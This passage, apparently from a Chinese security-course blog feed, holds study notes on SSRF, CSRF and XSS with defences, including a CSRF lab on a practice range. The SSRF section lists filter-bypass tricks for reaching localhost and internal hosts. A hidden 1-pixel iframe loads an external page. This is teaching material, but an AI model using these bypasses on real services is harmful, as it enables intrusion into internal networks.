CRLF注入实现GetShell</span><br><span class="line">对内网 Web 应用进行指纹识别，识别企业内部的资产信息...</span><br><span class="line">对外网服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息...</span><br><span class="line">攻击内外网的 Web 应用，主要是使用 HTTP GET 请求就可以实现的攻击(比如 struts2、SQli 等)....</span><br></pre></td></tr></table></figure><h1 id="三应用攻击"><a class="markdownIt-Anchor" href="#三应用攻击">#</a> 三：应用攻击</h1><p>☀CVE 系列：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">###CVE-2014-4210:Weblogic SSRF漏洞</span><br><span class="line">https://www.yuque.com/docs/share/d55ec421-82b7-43bf-95d3-9c17b3f0b880?#（密码：kvls） 《CVE-2014-4210：Weblogic SSRF漏洞》</span><br><span class="line"></span><br><span class="line">###CVE-2021-27905:Apache Solr SSRF漏洞</span><br><span class="line">https://www.yuque.com/docs/share/32e3ceba-4df6-4631-928c-37b75720a02d?# 《CVE-2021-27905：Apache Solr SSRF》</span><br></pre></td></tr></table></figure><h1 id="四挖掘防御"><a class="markdownIt-Anchor" href="#四挖掘防御">#</a> 四：挖掘防御</h1><h3 id="漏洞种类"><a class="markdownIt-Anchor" href="#漏洞种类">#</a> 》》》漏洞种类《《《</h3><h4 id="1显示响应"><a class="markdownIt-Anchor" href="#1显示响应">#</a> 1. 显示响应</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它显示对攻击者的响应，因此在服务器获取攻击者要求的URL后，它将把响应发送回攻击者。返回结果到客户端，如传送一个网址，会返回这个网址的界面或对应的 html 代码；</span><br></pre></td></tr></table></figure><h4 id="2不显示响应"><a class="markdownIt-Anchor" href="#2不显示响应">#</a> 2. 不显示响应</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和上面正好相反，不会返回结果到客户端。当您从未从初势请求中获取有关目标服务的任何信息时，就会发生这种ssrf。通常，攻击者将提供url，但是该url中的数据将永远不会返回给攻击者。要在这种情况下确认漏洞，攻击者必须使用Burp，DNSbin等类似工具。这些工具可以通过强制服务器向攻击者控制的服务器发出DNS或HTTP请求来确认服务器是易受攻击的。这种ssrf通常易于验证，但难以利用；</span><br></pre></td></tr></table></figure><h4 id="3semi-ssrf"><a class="markdownIt-Anchor" href="#3semi-ssrf">#</a> 3.Semi-SSRF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">与Blind相似，这种ssrf不会返回相关结果请求的所有详细信息，但是会暴露一些数据。这可能是部分数据或错误信息，他们为攻击者提供了更多信息；有时，关于请求的元数据（例如响应时间）也可以视为Semi-ssrf，因为它们允许攻击者验证请求是否成功；</span><br><span class="line">这种ssrf通常足以验证漏洞，但并不总是能够提取敏感数据；</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘"><a class="markdownIt-Anchor" href="#漏洞挖掘">#</a> 》》》漏洞挖掘《《《</h3><h3 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646463986394-172ce5bc-f2dc-41d8-89d3-c4192997be85.png" alt="img"></h3><h4 id="一从web功能寻找"><a class="markdownIt-Anchor" href="#一从web功能寻找">#</a> 一：从 WEB 功能寻找</h4><ol><li>分享：通过 URL 地址分享网页内容</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">○ 早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的&lt;tilte&gt;&lt;/title&gt;标签或者&lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;&quot;</span>/&gt;标签中content的文本内容作为显示以提供更好的用户体验;</span><br><span class="line">○ 通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞;</span><br><span class="line">○ 从国内某漏洞提交平台上提交的SSRF漏洞，可以发现包括淘宝、百度、新浪等国内知名公司都曾被发现过分享功能上存在SSRF的漏洞问题;</span><br></pre></td></tr></table></figure><ol><li>转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务；</span><br></pre></td></tr></table></figure><ol><li><p>在线翻译：通过 URL 地址翻译对应文本的内容。比如百度翻译，有道等；</p></li><li><p>图片加载与下载：通过指定的 URL 地址加载或下载图片；</p></li><li><p>图片文章收藏功能：从分享的 URL 中读取其原文的标题等；</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">○ 未公开的api实现以及其他调用URL的功能；此处类似的功能有<span class="number">360</span>提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容；</span><br></pre></td></tr></table></figure><h4 id="二从url关键字寻找"><a class="markdownIt-Anchor" href="#二从url关键字寻找">#</a> 二：从 URL 关键字寻找</h4><p>在对功能上存在 SSRF 漏洞中 URL 地址特征的观察，大致有以下关键字…</p><table><thead><tr><th>序号</th><th>关键字</th></tr></thead><tbody><tr><td>1</td><td>u</td></tr><tr><td>2</td><td>3g</td></tr><tr><td>3</td><td>src</td></tr><tr><td>4</td><td>url</td></tr><tr><td>5</td><td>wap</td></tr><tr><td>6</td><td>share</td></tr><tr><td>7</td><td>link</td></tr><tr><td>8</td><td>source</td></tr><tr><td>9</td><td>target</td></tr><tr><td>10</td><td>display</td></tr><tr><td>11</td><td>domain</td></tr><tr><td>12</td><td>sourceURI</td></tr><tr><td>13</td><td>imageURL</td></tr></tbody></table><h3 id="漏洞绕过"><a class="markdownIt-Anchor" href="#漏洞绕过">#</a> 》》》漏洞绕过《《《</h3><p>### 常见限制</p><ol><li>限制为 http://www.xxx.com 域名</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br></pre></td></tr></table></figure><ol><li>限制请求 IP 不为内网地址</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">（2）采取特殊域名</span><br><span class="line">（3）采取进制转换</span><br></pre></td></tr></table></figure><ol><li>限制请求只为 HTTP 协议</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br></pre></td></tr></table></figure><p>### 绕过方法</p><p>方法一：“@”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://abc@127.0.0.1</span><br><span class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</span><br><span class="line">http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</span><br><span class="line"></span><br><span class="line">在对@解析域名中，不同的处理函数存在处理差异，如：</span><br><span class="line">http://www.aaa.com@www.bbb.com@www.ccc.com</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com</span><br></pre></td></tr></table></figure><p>方法二：“[::]”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以利用[::]来绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure><p>方法三：添加端口号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p>方法四：利用短网址</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">站长工具短网址/百度短网址</span><br></pre></td></tr></table></figure><p>方法五：利用特殊域名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure><p>方法六：利用 DNS 解析…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在域名上设置A记录，指向127.0.0.1</span><br></pre></td></tr></table></figure><p>方法七：利用进制转换…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure><p>方法八：句号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><p>方法九：302 跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用https://tinyurl.com生成302跳转地址</span><br></pre></td></tr></table></figure><h3 id="漏洞防御"><a class="markdownIt-Anchor" href="#漏洞防御">#</a> 》》》漏洞防御《《《</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 禁止跳转；</span><br><span class="line">2. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090； </span><br><span class="line">3. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；</span><br><span class="line">4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）；</span><br><span class="line">5. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引 起的问题；</span><br><span class="line">6. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准；</span><br></pre></td></tr></table></figure><p>参考文档…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/6235#toc-9</span><br><span class="line">https://blog.csdn.net/lhh134/article/details/88298881</span><br><span class="line">https://blog.csdn.net/csdnnews/article/details/106726458</span><br><span class="line">https://as1def.github.io/2020/10/10/weblogic-SSRF-CVE-2014-4210/</span><br></pre></td></tr></table></figure><h1 id="五扩展文档"><a class="markdownIt-Anchor" href="#五扩展文档">#</a> 五：扩展文档</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#某scms代码审计-PHP</span><br><span class="line">https://xz.aliyun.com/t/10929</span><br><span class="line">#审计挖掘---CNVD通用漏洞</span><br><span class="line">https://xz.aliyun.com/t/10042</span><br><span class="line">#分析Emissary 的SSRF漏洞(CVE-2021-32639)</span><br><span class="line">https://xz.aliyun.com/t/10045</span><br></pre></td></tr></table></figure><h1 id="六今日作业"><a class="markdownIt-Anchor" href="#六今日作业">#</a> 六：今日作业</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.熟练掌握SSRF漏洞原理及攻击方式</span><br><span class="line">2.完成文档中的CVE漏洞复现并截图</span><br><span class="line">3.阅读扩展文档中的文章并总结于博客</span><br><span class="line">4.尝试批量挖掘SSRF漏洞....</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一知识回顾&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一知识回顾&quot;&gt;#&lt;/a&gt; 一：知识回顾&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2022-03-04T01:53:03.075Z</published>
    <updated>2022-03-04T01:53:03.075Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/CRSF%E6%94%BB%E5%87%BB/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/CRSF%E6%94%BB%E5%87%BB/</id>
    <published>2022-03-04T01:45:33.915Z</published>
    <updated>2022-03-04T01:52:55.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三天csrf跨站脚本攻击"><a class="markdownIt-Anchor" href="#第三天csrf跨站脚本攻击">#</a> 第三天：CSRF 跨站脚本攻击</h1><h1 id="csrf-漏洞描述"><a class="markdownIt-Anchor" href="#csrf-漏洞描述">#</a> csrf 漏洞描述</h1><p>CSRF 定义： 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF ， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。</p><p>简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操 作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><h1 id="csrf-漏洞攻击原理"><a class="markdownIt-Anchor" href="#csrf-漏洞攻击原理">#</a> csrf 漏洞攻击原理</h1><p>用户打开浏览器，访问登陆受信任的 A 网站，在用户信息通过验证后，服务器会返回一个 cookie 给浏览器，用户登陆网站 A 成功，可以正常发送请求到网站 A 用户未退出网站 A，在同一浏览器中，打开一个危险网站 B 网站 B 收到用户请求后，返回一些恶意代码，并发出请求要求访问网站 A 浏览器收到这些恶意代码以后，在用户不知情的情况下，利用 cookie 信息，向网站 A 发送恶意请求，网站 A 会根据 cookie 信息以用户的权限去处理该请求，导致来自网站 B 的恶意代码被执行；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631685427334-61e12841-adb2-4801-ac46-ad81d3363bf4.png" alt="img"></p><h1 id="csrf-漏洞攻击"><a class="markdownIt-Anchor" href="#csrf-漏洞攻击">#</a> CSRF 漏洞攻击</h1><p>打开 pichachu 靶场来到 csrf（get）漏洞，输入用户登录后发现修改密码处没有任何验证，存在 csrf 攻 击，通过 csrf 漏洞攻击修改资料。 账号和密码 vinc 12345；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631685701310-669616f6-2367-4f89-965b-0586a9854892.png" alt="img"></p><p>修改个人信息， 使用 burpsuite 构造攻击 exp 输入信息后 选择 generate csrf-poc</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631685817030-0e819091-b09b-4569-be17-de5ad07e9061.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631685847122-4bc5bf63-3f48-4efc-9c05-d614fcb58b2a.png" alt="img"></p><p>受害者受到攻击的途径有</p><p>1. 受害者登录网站后，没有退出的情况下，访问网站 b 触发</p><p>2. 在存在漏洞的网站，挖掘 xss 漏洞，自动调用这 poc.html</p><p>受害者访问 poc.html 点击 poc.html</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631685996198-ad3a2d40-f12a-456a-9901-398500701a3e.png" alt="img"></p><h1 id="csrf-防御方案"><a class="markdownIt-Anchor" href="#csrf-防御方案">#</a> CSRF 防御方案</h1><ol><li><p>增加 Token 验证（常用做法）</p></li><li><ol><li>对关键操作增加 Token 参数，token 必须随机，每次都不一样；</li></ol></li><li><p>关于安全的会话管理（避免会话被利用）</p></li><li><ol><li>不要在客户端保存敏感信息（比如身份验证信息）；</li><li>退出、关闭浏览器时的会话过期机制 ；</li></ol></li><li><ol><li>设置会话过机制，比如 15 分钟无操作，则自动登录超时；</li></ol></li><li><p>访问控制安全管理</p></li><li><ol><li>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码；</li><li>敏感信息的修改使用 POST，而不是 GET；</li></ol></li><li><ol><li>通过 HTTP 头部中的 REFERER 来限制原页面；</li></ol></li><li><p>增加验证码</p></li><li><ol><li>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）；</li></ol></li></ol><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第三天csrf跨站脚本攻击&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第三天csrf跨站脚本攻击&quot;&gt;#&lt;/a&gt; 第三天：CSRF 跨站脚本攻击&lt;/h1&gt;
&lt;h1 id=&quot;csrf-漏洞描述&quot;&gt;&lt;a class=&quot;markdownIt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/XSS%E6%94%BB%E5%87%BB/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/XSS%E6%94%BB%E5%87%BB/</id>
    <published>2022-03-04T01:43:21.758Z</published>
    <updated>2022-03-09T10:55:00.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二天xss跨站脚本攻击"><a class="markdownIt-Anchor" href="#第二天xss跨站脚本攻击">#</a> 第二天：XSS 跨站脚本攻击</h1><h1 id="http的基础"><a class="markdownIt-Anchor" href="#http的基础">#</a> http 的基础</h1><p>http 的请求方式</p><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220309134426849.png" alt="image-20220309134426849"></p><p>http 的请求数据报的格式</p><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220309134536091.png" alt="image-20220309134536091"></p><p>http 相应数据报的格式</p><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220309134848262.png" alt="image-20220309134848262"></p><p>关键的字段：set-cookie：当客户端第一次请求服务器时，服务器会生成一个 cookie 值发送给客户端，用来保证客户端再次请求服务器时保持会话</p><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220309141314852.png" alt="image-20220309141314852"></p><p>​cookie：客户端请求服务器用 cookie 来保持会话</p><p>​cookie 特点：明文、可以修改、大小受到限制</p><p>​                        cookie 的用途：记住用户的登录状态；跟踪用户的行为</p><p>http 相应的特点：1）请求应答模式</p><p>​   2）灵活可扩展（首先传送的数据类型多种多样，并且在相应与请求头中的字段可以添加）</p><p>​                               3）可靠的传输（工作在传输层中，具有三次握手与四次挥手，提供可靠的数据传输）</p><p>​                               4)  无状态（每次的请求与相应都是不清楚数据请求与相应的来源），无法保持会话</p><h1 id="xss-漏洞介绍"><a class="markdownIt-Anchor" href="#xss-漏洞介绍">#</a> xss 漏洞介绍</h1><p>XSS 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628762504451-52222a74-130f-4039-af4b-924ff5c32373.png" alt="img"></p><h1 id="xss-攻击的危害包括"><a class="markdownIt-Anchor" href="#xss-攻击的危害包括">#</a> XSS 攻击的危害包括</h1><p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号；</p><p>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 ；</p><p>3、盗窃企业重要的具有商业价值的资料 ；</p><p>4、非法转账 ；</p><p>5、强制发送电子邮件 ；</p><p>6、网站挂马 ；</p><p>7、控制受害者机器向其它网站发起攻击  ；</p><h1 id="xss-防御"><a class="markdownIt-Anchor" href="#xss-防御">#</a> XSS 防御</h1><p>XSS 防御的总体思路是：对输入 (和 URL 参数) 进行过滤，对输出进行编码，也就是对提交的所有内容进行过滤，对 url 中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行；</p><h1 id="xss-漏洞的类型"><a class="markdownIt-Anchor" href="#xss-漏洞的类型">#</a> xss 漏洞的类型</h1><h2 id="反射型-xss"><a class="markdownIt-Anchor" href="#反射型-xss">#</a> 反射型 XSS</h2><pre><code>反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码，反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击；  </code></pre><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628762821870-fbec1062-da3e-491c-b614-ee9bafb3eb47.png" alt="img"></p><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220309182424447.png" alt="image-20220309182424447"></p><h4 id="代码分析"><a class="markdownIt-Anchor" href="#代码分析">#</a> 代码分析</h4><p>在反射型 xss 代码中，首先判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>m</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">]</mo><mtext>是否等于</mtext><mi>k</mi><mi>o</mi><mi>b</mi><mi>e</mi><mtext>，如果不是则在页面中将</mtext></mrow><annotation encoding="application/x-tex">_GET[&#x27;mssage&#x27;]是否等于 kobe，如果不是则在页面中将</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">将</span></span></span></span>_GET [‘mssage’] 复制给 $html 变量中，而且没有任何过滤再输出到页面中，所以直接输入页面会直接输出 xss 信息，就会造成 xss 攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670175979-5a5a67dd-5390-4beb-8eff-cf8fc1838fc5.png" alt="img"></p><h2 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss">#</a> 存储型 XSS</h2><p>存储型 XSS，持久化，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670403710-ca1f691e-953c-413a-b8cb-f117f0ddad8f.png" alt="img"></p><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220309182926501.png" alt="image-20220309182926501"></p><h4 id="代码分析-2"><a class="markdownIt-Anchor" href="#代码分析-2">#</a> 代码分析</h4><p>在存储型 xss 代码分析中，看到留言的 inster into 语句中，直接插入留言信息， 没有任何过滤，输入恶意代码，这个代码将记录在数据中；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670504596-17163a1f-00f7-4764-948a-ce475c6c0311.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670616784-e6c094f2-d7e9-4bac-b5c4-34d31a73705c.png" alt="img"></p><p>浏览器在访问该页面的时，恶意代码会从数据库字段里取出这条记录，没有经过任何处理就直接输出；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670670614-250bc148-6241-44cb-b062-ebc7b28cc43a.png" alt="img"></p><p>访问页面，调用代码，执行代码；</p><h2 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss">#</a> DOM 型 XSS</h2><p>DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用；</p><p>经常出现 dom xss 的关键语句：</p><ul><li><ul><li>document.referer 属性</li><li><span class="exturl" data-url="aHR0cDovL3dpbmRvdy5uYW1l">window.name</span> 属性</li></ul></li><li><ul><li>location 属性</li><li>innerHTML 属性</li></ul></li><li><ul><li>documen.write 属性</li></ul></li></ul><p><img 